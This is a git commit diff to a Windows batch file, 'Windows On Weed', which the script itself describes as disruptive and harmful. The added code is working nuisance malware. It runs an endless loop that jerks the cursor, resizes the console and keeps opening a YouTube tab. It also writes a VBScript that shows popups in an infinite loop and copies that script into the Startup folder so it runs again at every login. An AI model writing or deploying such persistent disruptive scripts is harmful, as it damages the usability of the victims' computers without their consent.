27ad1ef0c6d989565517fa424fc29a1a1315feae
Enginner <75962433+EnginnerDog@users.noreply.github.com>
2023-10-01 00:42:13 +0100

    Update weed.bat

--- weed.bat
+++ weed.bat
@@ -1,29 +1,29 @@
 @echo off
-title Windows On Weed v1
-echo Windows On Weed v1
+title Windows On Weed v2 beta
+echo Windows On Weed v2 beta
 echo WARNING: Using this tool is highly disruptive, unethical, and may cause harm or damage to systems or data. Use at your own risk!
-echo WARNING: This version includes opening a Rickroll video and flashing screens. Proceed with caution!
+echo WARNING: This version includes opening a Rickroll video, flashing screens, random crap on the screen, and an unclosable VBS script that spams "weed" on startup. Proceed with extreme caution!
 
 pause
 
 :start
-set /a "x=!random! %% 1920"
-set /a "y=!random! %% 1080"
+rundll32 user32.dll,SetCursorPos -32000,-32000
+timeout /t 1 /nobreak >nul
+rundll32 user32.dll,SetCursorPos 32000,32000
+timeout /t 1 /nobreak >nul
 
-rundll32 user32.dll,SetCursorPos !x!,!y!
-ping -n 1 -w 1000 127.0.0.1 >nul
+mode con:cols=1 lines=1
+timeout /t 1 /nobreak >nul
+mode con:cols=80 lines=25
+timeout /t 1 /nobreak >nul
 
 start https://www.youtube.com/watch?v=dQw4w9WgXcQ
 
-color 0A
-timeout /t 1 /nobreak >nul
-color 0F
-timeout /t 1 /nobreak >nul
+echo Set objShell = WScript.CreateObject("WScript.Shell") > weed.vbs
+echo Do >> weed.vbs
+echo     objShell.Popup "weed",0,"Windows On Weed",0+16 >> weed.vbs
+echo Loop >> weed.vbs
 
-set /a "x=!random! %% 1920"
-set /a "y=!random! %% 1080"
-
-rundll32 user32.dll,SetCursorPos !y!,!x!
-ping -n 1 -w 1000 127.0.0.1 >nul
+copy weed.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 goto start
